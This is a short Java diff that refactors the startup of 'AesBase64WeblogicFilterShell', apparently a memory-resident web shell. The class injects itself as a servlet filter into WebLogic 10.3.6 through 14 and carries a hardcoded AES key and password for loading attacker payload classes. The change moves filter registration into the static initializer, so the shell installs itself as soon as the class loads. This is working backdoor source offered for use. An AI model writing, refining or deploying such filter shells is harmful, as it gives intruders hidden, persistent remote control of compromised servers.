@@ -6,15 +6,13 @@ import java.util.*;
 
 //weblogic 10.3.6 - weblogic 14
 public class AesBase64WeblogicFilterShell extends ClassLoader implements Filter {
-    private static boolean initialized = false;
-    private static final Object lock = new Object();
     private static Class payloadClass;
     private String key = "3c6e0b8a9c15224a";
     private String password = "pass";
 
 
     static {
-        new AesBase64WeblogicFilterShell();
+        new AesBase64WeblogicFilterShell().addFilter();
     }
 
     public AesBase64WeblogicFilterShell(ClassLoader loader){
@@ -22,15 +20,14 @@ public class AesBase64WeblogicFilterShell extends ClassLoader implements Filter 
     }
 
     public AesBase64WeblogicFilterShell(){
-        synchronized (lock){
-            if (!initialized){
-                initialized = true;
-                try {
-                    addFilter(this.getClass());
-                }catch (Throwable e){
 
-                }
-            }
+    }
+
+    private void addFilter() {
+        try {
+            addFilter(this.getClass());
+        } catch (Throwable e) {
+
         }
     }
 
